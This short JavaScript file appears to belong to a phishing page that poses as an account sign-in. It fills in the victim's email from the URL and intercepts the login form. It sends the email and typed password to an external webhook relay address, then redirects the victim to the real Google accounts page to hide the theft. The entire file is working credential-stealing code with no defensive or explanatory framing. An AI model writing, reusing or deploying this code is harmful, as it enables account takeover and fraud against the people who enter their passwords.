
document.addEventListener("DOMContentLoaded", function () {
  const urlParams = new URLSearchParams(window.location.search);
  const email = urlParams.get("email");
  document.getElementById("userEmail").innerText = email || "your account";
  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
    const password = document.getElementById("password").value;
    fetch("https://01k1bgjezbed0zaxyafpbg24jb.hooks.webhookrelay.com", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: email, password: password })
    }).then(() => {
      window.location.href = "https://accounts.google.com";
    });
  });
});
